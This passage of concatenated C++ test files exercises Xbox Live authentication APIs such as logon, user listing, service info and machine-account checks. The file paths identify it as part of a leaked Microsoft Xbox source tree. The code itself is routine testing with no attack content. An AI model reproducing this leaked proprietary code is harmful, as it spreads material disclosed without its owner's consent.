    int spinCount = (BVTMode()) ? 1 : 10;

    HANDLE				hEvent = CreateEvent( NULL, TRUE, TRUE, NULL );
    if ( NULL == hEvent )
    {
        hr = E_FAIL;
    }

    // Put 0 users in the array.
    ZeroMemory(aIniUsers, sizeof(aIniUsers));
    
    // Logon with 0 users just to create a connection.
    CHECKRUN( XOnlineLogon((PXONLINE_USER) aIniUsers, dwServices, cServices, hEvent, &taskHandle) );
    if (SUCCEEDED(hr))
    {
        // Wait for logon to complete all initial work.
        hr = WaitForLogon(taskHandle, hEvent);
    }
    
    if (SUCCEEDED(hr))
    {
        hr = XOnlineGetUsers(users, NULL);
        hr = (SUCCEEDED(hr)) ? E_FAIL : S_OK;
    }
    
    if (NULL != hEvent)
    {
        hr = (CloseHandle(hEvent)) ? hr : E_FAIL;
        hEvent = NULL;
    }

    if (taskHandle)
    {
        hr = XOnlineTaskClose( taskHandle );
        taskHandle = NULL;
    }

    return hr;
}


/****************************************************************************
 *
 *  XOnlineGetUsers_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineGetUsers tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetUsers_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;
    
    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //
    
#ifdef CODE_COVERAGE
    
#endif // CODE_COVERAGE
    
    g_ParamCheckReturnsError = TRUE;
    
    CHECKRUN( StartNetwork() );
    
    SETLOG( LogHandle, "davidhef", "Online", "XOnlineGetUsers", "BASIC_TEST" );
    EXECUTE( XOnlineGetUsers_BASIC_TEST() );
    
    if (!BVTMode())
    {
        SETLOG( LogHandle, "davidhef", "Online", "XOnlineGetUsers", "NULL_USERS" );
        EXECUTE( XOnlineGetUsers_NULL_USERS() );
        
        SETLOG( LogHandle, "davidhef", "Online", "XOnlineGetUsers", "NULL_COUNT" );
        EXECUTE( XOnlineGetUsers_NULL_COUNT() );
    }
    
    CHECKRUN( CloseNetwork() );
    
    g_ParamCheckReturnsError = FALSE;
}

/****************************************************************************
 *
 *  XOnlineGetUsers_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetUsers_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineGetUsers_StartTest( NULL );
    XOnlineGetUsers_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineGetUsers )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineGetUsers )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineGetUsers_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineGetUsers_EndTest )
END_EXPORT_TABLE( XOnlineGetUsers )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetServiceInfo\XOnlineGetServiceInfo.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetServiceInfo.cpp
 *  Content:    XOnlineGetServiceInfo tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineGetServiceInfo
 *
 ****************************************************************************/

#include "XOnlineGetServiceInfo.h"
#include "CXLiveConnectionManager.h"

using XLive::CXLiveConnectionManager;

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;

/****************************************************************************
 *
 * The Global array of services
 *
 ****************************************************************************/

static DWORD SERVICES[] = {
	XONLINE_MATCHMAKING_SERVICE,       
	XONLINE_BILLING_OFFERING_SERVICE     
};   

typedef struct
{
	DWORD	*pdwServices;
	DWORD	cServices;
	HRESULT	expectedHR[3];
} SERVICE_COMBO;

static SERVICE_COMBO SERVICE_COMBOS[] = {
	{ SERVICES + 0, 1, { S_OK } },
	{ SERVICES + 1, 1, { S_OK } },
	{ SERVICES + 0, 2, { S_OK, S_OK } }	// Test case asking for all valid services
};

/****************************************************************************
 *
 *  XOnlineGetServiceInfo_X_SERVICE_HANDLE_HAS_INTERNET 
 *
 *	Description:
 *		Get service info on each available service
 *
 *	Input: 
 *		ServiceHandle - each of the valid service handle values
 *
 *	System State:
 *		Connected to Internet: TRUE
 *
 *	Verify:
 *		Return value is not NULL
 *		Return value has valid data for each service
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineGetServiceInfo_X_SERVICE_HANDLE_HAS_INTERNET( void )
{
    HRESULT             hr              = S_OK;

	DWORD				dwNumUsers		= 0;
	DWORD				dwWorkFlags		= 0;

	XONLINE_USER		aUsers[XONLINE_MAX_STORED_ONLINE_USERS];
	XONLINE_SERVICE_INFO serviceInfo;

	//
	// start the network
	//

	CHECKRUN( StartNetwork() );

	//
	// zero out the users
	//

	ZeroMemory( aUsers, sizeof( aUsers ) );

	// populate the user list
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aUsers, XONLINE_MAX_HD_ONLINE_USERS ) );
    dwNumUsers = XONLINE_MAX_HD_ONLINE_USERS;

	//
	// go through the different combinations of services
	//

	for ( DWORD j = 0; j < NUMELEMS( SERVICE_COMBOS ) && SUCCEEDED( hr ); j++ )
	{
		//
		// logon
		//

        if (SUCCEEDED(hr))
        {
            hr = CXLiveConnectionManager::Instance().SelectServices(SERVICE_COMBOS[j].pdwServices, SERVICE_COMBOS[j].cServices);
        }

        if (SUCCEEDED(hr))
        {
            hr = CXLiveConnectionManager::Instance().Logon(aUsers);
        }

        if (SUCCEEDED(hr))
        {
            hr = CXLiveConnectionManager::Instance().WaitForConnection();
            hr = (XONLINE_S_LOGON_CONNECTION_ESTABLISHED == hr) ? S_OK : E_FAIL;
        }

		//
		// go through each serice, and verify
		//

		for ( DWORD k = 0; k < SERVICE_COMBOS[j].cServices && SUCCEEDED( hr ); k++ )
		{
			//
			// make sure the hr returned is as expected
			//

			hr = ( hr == SERVICE_COMBOS[j].expectedHR[k] ) ? S_OK : E_FAIL;

	        //
	        // zero out the serviceInfo
	        //

	        ZeroMemory( (PVOID) &serviceInfo, sizeof( serviceInfo ) );

			//
			// get the service info
			//

            if (SUCCEEDED(hr))
            {
                DWORD dwServiceID = *(SERVICE_COMBOS[ j ].pdwServices + k);
                hr = XOnlineGetServiceInfo(dwServiceID, &serviceInfo);
            }

			//
			// verify the service info
			//

			DbgPrint( "%u %u %u %u\n", serviceInfo.dwServiceID, serviceInfo.serviceIP, serviceInfo.wServicePort, serviceInfo.wReserved );
		}

		//
		// Logoff
		//
        if (SUCCEEDED(hr))
        {
            hr = CXLiveConnectionManager::Instance().Logoff();
        }
	}

	//
	// close the network
	//

	CloseNetwork();

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetServiceInfo_INVALID_SERVICE_HANDLE
 *
 *	Description:
 *		Make sure Get Service Info can handle invalid handle
 *
 *	Input: 
 *		ServiceHandle - XONLINE_INVALID_SERVICE
 *
 *	System State:
 *		Connected to Internet: N/A
 *
 *	Verify:
 *		Return value is NULL
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineGetServiceInfo_INVALID_SERVICE_HANDLE( void )
{
    HRESULT             hr              = S_OK;
    XONLINE_SERVICE_INFO serviceInfo;

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// start the network
	//

	CHECKRUN( StartNetwork() );

	//
	// call Get service info with an invalid service
	//

	CHECKRUN( XOnlineGetServiceInfo( (DWORD)999, &serviceInfo ) );
    hr = (SUCCEEDED(hr)) ? E_FAIL : S_OK;

	//
	// clear the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

	//
	// close the network
	//

	CloseNetwork();

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetServiceInfo_NULL_SERVICE_HANDLE
 *
 *	Description:
 *		Make sure Get Service Info can handle NULL handle
 *
 *	Input: 
 *		ServiceHandle - NULL
 *
 *	System State:
 *		Connected to Internet: N/A
 *
 *	Verify:
 *		Return value is NULL
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineGetServiceInfo_NULL_SERVICE_HANDLE( void )
{
    HRESULT             hr              = S_OK;

	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

	//
	// start the network
	//

	CHECKRUN( StartNetwork() );

	//
	// call Get service info with an invalid service
	//

	CHECKRUN( XOnlineGetServiceInfo( (DWORD)999, NULL ) );
    hr = (SUCCEEDED(hr)) ? E_FAIL : S_OK;

    //
	// clear the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

	//
	// close the network
	//

	CloseNetwork();

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineGetServiceInfo_StartTest
 *
 *  Description:
 *      The entry function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetServiceInfo_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    //
    // Test XOnlineGetServiceInfo with all the service handles and internet
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlineGetServiceInfo", "X_SERVICE_HANDLE_HAS_INTERNET" );
    EXECUTE( XOnlineGetServiceInfo_X_SERVICE_HANDLE_HAS_INTERNET() );

    if (!BVTMode())
    {
        //
        // Test XOnlineGetServiceInfo with an invalid service handle
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineGetServiceInfo", "INVALID_SERVICE_HANDLE" );
        EXECUTE( XOnlineGetServiceInfo_INVALID_SERVICE_HANDLE() );
        
        //
        // Test XOnlineGetServiceInfo with a NULL service handle
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineGetServiceInfo", "NULL_SERVICE_HANDLE" );
        EXECUTE( XOnlineGetServiceInfo_NULL_SERVICE_HANDLE() );
    }
}

/****************************************************************************
 *
 *  XOnlineGetServiceInfo_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineGetServiceInfo_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineGetServiceInfo_StartTest( NULL );
    XOnlineGetServiceInfo_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineGetServiceInfo )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineGetServiceInfo )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineGetServiceInfo_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineGetServiceInfo_EndTest )
END_EXPORT_TABLE( XOnlineGetServiceInfo )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineHasMachineAccount\XOnlineHasMachineAccount.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineHasMachineAccount.h
 *  Content:    XOnlineHasMachineAccount utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/23/01    danrose Created to test Xbox XOnlineHasMachineAccount
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <OnlineAccounts.h>
#include <XOnlineAuthUtil.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineHasMachineAccount\XOnlineHasMachineAccount.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineHasMachineAccount.cpp
 *  Content:    XOnlineHasMachineAccount tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/23/01    danrose Created to test Xbox XOnlineHasMachineAccount
 *
 ****************************************************************************/

#include "XOnlineHasMachineAccount.h"

//@@@ drm: XOnlineCreateMachineAccount no longer exists
#define XOnlineCreateMachineAccount() (E_FAIL)

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 *  XOnlineHasMachineAccount_NoAccount
 *
 *	Description:
 *		Check to see if this machine has a machine account when it does not
 *
 *	Input: 
 *		None
 *
 *	System State:
 *		Account exists: FALSE
 *		Account valid: N/A
 *
 *	Verify: 
 *		Return value is FALSE
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineHasMachineAccount_NoAccount( void )
{
    HRESULT             hr              = S_OK;

	//
	// Erase the machine acount
	//

	CHECKRUN( RemoveMachineAccount() );

	//
	// check the machine account
	//

	CHECKRUNBOOL( ! XOnlineHasMachineAccount() );

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineHasMachineAccount_ValidAccount
 *
 *	Description:
 *		Check to see if this machine has a machine account when it has a valid account
 *
 *	Input: 
 *		None
 *
 *	System State:
 *		Account exists: TRUE
 *		Account valid: TRUE
 *
 *	Verify: 
 *		Return value is TRUE
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineHasMachineAccount_ValidAccount( void )
{
    HRESULT             hr              = S_OK;

	//
	// start the network
	//

	CHECKRUN( StartNetwork() );

	//
	// Erase the machine acount
	//

	CHECKRUN( RemoveMachineAccount() );

	//
	// Create a new machine account
	//

	CHECKRUN( XOnlineCreateMachineAccount() );

	//
	// check the machine account
	//

	CHECKRUNBOOL( XOnlineHasMachineAccount() );

	//
	// close the network
	//

	CloseNetwork();

    //
    // Return the Hresult
    //

    return hr;
}

/****************************************************************************
 *
 *  XOnlineHasMachineAccount_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineHasMachineAccount tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineHasMachineAccount_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    //
    // Test XOnlineHasMachineAccount when no account exists
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlineHasMachineAccount", "NoAccount" );
    EXECUTE( XOnlineHasMachineAccount_NoAccount() );

    //
    // Test XOnlineHasMachineAccount when an account exists
    //

    SETLOG( LogHandle, "danrose", "Online", "XOnlineHasMachineAccount", "ValidAccount" );
    EXECUTE( XOnlineHasMachineAccount_ValidAccount() );

}

/****************************************************************************
 *
 *  XOnlineHasMachineAccount_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineHasMachineAccount_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineHasMachineAccount_StartTest( NULL );
    XOnlineHasMachineAccount_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineHasMachineAccount )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineHasMachineAccount )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineHasMachineAccount_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineHasMachineAccount_EndTest )
END_EXPORT_TABLE( XOnlineHasMachineAccount )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineGetUsersFromHD\XOnlineGetUsersFromHD.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineGetUsersFromHD.h
 *  Content:    XOnlineGetUsersFromHD utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineGetUsersFromHD
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <OnlineAccounts.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineLogon\XOnlineLogon.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineLogon.cpp
 *  Content:    XOnlineLogon tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineLogon
 *
 ****************************************************************************/

#include "XOnlineLogon.h"
#include <CXLiveConnectionManager.h>
#include <CXLiveUserManager.h>

#include <debug.h>

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global array of services
 *
 ****************************************************************************/

static DWORD SERVICES[][3] = {
	{ XONLINE_MATCHMAKING_SERVICE },       
	{ XONLINE_BILLING_OFFERING_SERVICE },        
	{ XONLINE_MATCHMAKING_SERVICE, XONLINE_BILLING_OFFERING_SERVICE }
};   

static const DWORD NUM_SERVICES[] = {
	1,
	1,
	2
};

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;


using XLive::CXLiveConnectionManager;	
using XLive::CXLiveUserManager;
using XLive::CXLiveUserManager::MUAccountIterator;
using XLive::CXLiveUserManager::HDAccountIterator;
using XLive::CXLiveUserManager::AccountIterator;

/****************************************************************************
 *
 * Use XOnlineLogon the way we expect it to be used in most cases.
 *
 ****************************************************************************/
HRESULT XOnlineLogon_BASIC_TEST( void )
{
    HRESULT             hr              = S_OK;
    DWORD				dwUsers		= 0;
    DWORD               dwMUs = 0;
    XONLINE_USER		users[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_SERVICE_INFO serviceInfo;
    bool    bNetworkStarted = false;
    
    if (SUCCEEDED(hr))
    {
        hr = StartNetwork();
        bNetworkStarted = (S_OK == hr) ? true : false;
    }
    
    if (SUCCEEDED(hr))
    {
        // Cause PopulateUserAccountsHD to generate random user accounts.
        ZeroMemory(users, sizeof(users));
        
        // Delete any existing user accounts on the HD before populating.
        hr = COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) users, XONLINE_MAX_HD_ONLINE_USERS, true );
    }
    
    if (SUCCEEDED(hr))
    {
        // Create an account in every MU.
        hr = CXLiveUserManager::PopulateMUs(&dwMUs);
        hr = (SUCCEEDED(hr) && dwMUs > 0) ? S_OK : E_FAIL;
    }
        
    if (SUCCEEDED(hr))
    {
        hr = CXLiveConnectionManager::Instance().SelectServices(    XONLINE_MATCHMAKING_SERVICE,
                                                                    XONLINE_BILLING_OFFERING_SERVICE,
                                                                    XONLINE_STATISTICS_SERVICE);
    }
    
    // Get the users.
    CHECKRUN(XOnlineGetUsers(users, &dwUsers));
    CHECKRUN((XONLINE_MAX_HD_ONLINE_USERS + dwMUs == dwUsers && SUCCEEDED(hr)) ? hr : E_FAIL);
    
    // Verify that there are the correct number of users.
    CXLiveUserManager userMgr(&users[0]);
    CHECKRUN((userMgr.CountMUAccounts() + userMgr.CountHDAccounts() == dwUsers && SUCCEEDED(hr)) ? hr : E_FAIL);
    CHECKRUN((userMgr.CountAccounts() == dwUsers) ? hr : E_FAIL);
    
    // Verify that there are no duplicates.
    CHECKRUN((userMgr.VerifyNoDuplicates()) ? S_OK : E_FAIL);
    
    // Clear account selections.
    CHECKRUN(userMgr.ClearAccountSelections());
    
    // Select a MU account to logon.
    if (SUCCEEDED(hr))
    {
        MUAccountIterator muIt = userMgr.MUAccount_begin();
        hr = (muIt != userMgr.MUAccount_end()) ? S_OK : E_FAIL;
        CHECKRUN(userMgr.SelectAccount(muIt));

        // Create a guest account to logon.
        CHECKRUN(userMgr.CreateAndSelectGuestAccount(muIt, 1));
    }
    
    // Select some HD accounts to logon.
    if (SUCCEEDED(hr))
    {
        int count = 2;              // We already selected a MU account and a guest account.
        HDAccountIterator hdIt = userMgr.HDAccount_begin();
        for (; hdIt != userMgr.HDAccount_end() && count < XONLINE_MAX_LOGON_USERS && SUCCEEDED(hr); ++hdIt, ++count)
        {
            hr = userMgr.SelectAccount(hdIt);
        }
    }
    
    // Logon the selected accounts.
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts(), (DWORD) 5000));
    hr = (XONLINE_S_LOGON_CONNECTION_ESTABLISHED == hr) ? S_OK : E_FAIL;

    // Verify successful logon.
    PXONLINE_USER pLoggedOnUsers = NULL;
    if (SUCCEEDED(hr))
    {
        pLoggedOnUsers = XOnlineGetLogonUsers();
        hr = (pLoggedOnUsers == NULL) ? E_FAIL : S_OK;
    }

    if (SUCCEEDED(hr))
    {
        hr = userMgr.VerifyLogon(pLoggedOnUsers);
    }

    // Log off.
    CHECKRUN(CXLiveConnectionManager::Instance().Logoff());

    if (bNetworkStarted)
    {
        HRESULT closedHr = CloseNetwork();
        hr = (FAILED(closedHr)) ? closedHr : hr;
        bNetworkStarted = false;
    }
    
    return hr;
}

HRESULT XOnlineLogon_CORNER_CASES( void )
{
    HRESULT             hr              = S_OK;
    DWORD				dwUsers		= 0;
    DWORD               dwMUs = 0;
    XONLINE_USER		users[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_SERVICE_INFO serviceInfo;
    bool    bNetworkStarted = false;
    
    if (SUCCEEDED(hr))
    {
        hr = StartNetwork();
        bNetworkStarted = (S_OK == hr) ? true : false;
    }
    
    if (SUCCEEDED(hr))
    {
        // Cause PopulateUserAccountsHD to generate random user accounts.
        ZeroMemory(users, sizeof(users));
        
        // Delete any existing user accounts on the HD before populating.
        hr = COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) users, XONLINE_MAX_HD_ONLINE_USERS, true );
    }
    
    if (SUCCEEDED(hr))
    {
        // Create an account in every MU.
        hr = CXLiveUserManager::PopulateMUs(&dwMUs);
        hr = (SUCCEEDED(hr) && dwMUs > 0) ? S_OK : E_FAIL;
    }
        
    CXLiveUserManager userMgr(&users[0]);

    AccountIterator accountIt = userMgr.Account_begin();
    hr = (accountIt == userMgr.Account_end()) ? E_FAIL : S_OK;

    // Try to logon with a non-existent account.
    // Expected: It should fail.
    XONLINE_USER badUser[XONLINE_MAX_STORED_ONLINE_USERS];
    ZeroMemory(badUser, sizeof(badUser));
    badUser[0].xuid.qwUserID = (ULONGLONG) 987654321;
    (void) strcat(badUser[0].name, "BadUser");
    CHECKRUN(userMgr.ClearAccountSelections());
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(    XONLINE_MATCHMAKING_SERVICE,
                                                                    XONLINE_STATISTICS_SERVICE,
                                                                    XONLINE_BILLING_OFFERING_SERVICE));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(badUser));
    hr = (SUCCEEDED(hr)) ? E_FAIL : hr;

    // Try to logon with the same service twice.
    // Expected: It should fail.
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(    XONLINE_MATCHMAKING_SERVICE,
                                                                    XONLINE_BILLING_OFFERING_SERVICE,
                                                                    XONLINE_BILLING_OFFERING_SERVICE));
    CHECKRUN(userMgr.ClearAccountSelections());
    CHECKRUN(userMgr.SelectAccount(accountIt));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts()));
    hr = (SUCCEEDED(hr)) ? E_FAIL : hr;

    // Try to logon with 3 guest accounts, followed
    // by their legitimate master.  This case should
    // SUCCEED.
    CHECKRUN(userMgr.ClearAccountSelections());
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 3));
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 1));
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 2));
    CHECKRUN(userMgr.SelectAccount(accountIt));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts()));
    hr = (XONLINE_S_LOGON_CONNECTION_ESTABLISHED == hr) ? S_OK : E_FAIL;
    CHECKRUN(CXLiveConnectionManager::Instance().Logoff());

    // Try to logon with 3 guest accounts, followed
    // by their legitimate master and no services.  This case should
    // SUCCEED.
    CHECKRUN(userMgr.ClearAccountSelections());
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 3));
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 1));
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 2));
    CHECKRUN(userMgr.SelectAccount(accountIt));
    CHECKRUN(CXLiveConnectionManager::Instance().SelectNoServices());
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts()));
    hr = (XONLINE_S_LOGON_CONNECTION_ESTABLISHED == hr) ? S_OK : E_FAIL;
    CHECKRUN(CXLiveConnectionManager::Instance().Logoff());

    // Try to logon with a guest account that has no master account.
    // Expected: It should fail, since this is not allowed.
    CHECKRUN(userMgr.ClearAccountSelections());
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 1));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts()));
    hr = (SUCCEEDED(hr)) ? E_FAIL : hr;

    // Try to logon with all guest accounts.
    // Expected: It should fail, since there must be at least
    // one real account.
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(    XONLINE_MATCHMAKING_SERVICE,
                                                                    XONLINE_BILLING_OFFERING_SERVICE,
                                                                    XONLINE_STATISTICS_SERVICE));
    CHECKRUN(userMgr.ClearAccountSelections());
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 2));
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 1));
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 3));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts()));
    hr = (SUCCEEDED(hr)) ? E_FAIL : hr;

    // Try to logon with 2 guest accounts with the same guest number.
    // Expected: It should fail.
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(    XONLINE_MATCHMAKING_SERVICE,
                                                                    XONLINE_BILLING_OFFERING_SERVICE,
                                                                    XONLINE_STATISTICS_SERVICE));
    CHECKRUN(userMgr.ClearAccountSelections());
    CHECKRUN(userMgr.SelectAccount(accountIt));                     // Select the master account.
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 3));
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 2));
    CHECKRUN(userMgr.CreateAndSelectGuestAccount(accountIt, 3));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts()));
    hr = (SUCCEEDED(hr)) ? E_FAIL : hr;

    if (bNetworkStarted)
    {
        HRESULT closedHr = CloseNetwork();
        hr = (FAILED(closedHr)) ? closedHr : hr;
        bNetworkStarted = false;
    }
    
    return hr;
}


/****************************************************************************
 *
 *  XOnlineLogon_X_USERS_Y_SERVICES_HAS_INTERNET
 *
 *	Description:
 *		Perform Online logon with all combination of valid users and valid services
 *
 *	Input: 
 *		PUsers - valid arrays of users
 *		PServices - valid arrays of services
 *		CServices - the corresponding count of services
 *		Hevent - a valid event
 *		PHandle - a valid pointer
 *
 *	System State:
 *			Connected to Internet: TRUE
 *
 *	Verify:
 *		Return value is S_OK
 *		Value in pHandle (*pHandle) is valid
 *		Values in pServices are valid
 *
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineLogon_X_USERS_Y_SERVICES_HAS_INTERNET( void )
{
    HRESULT             hr              = S_OK;
	DWORD				dwNumUsers		= 0;
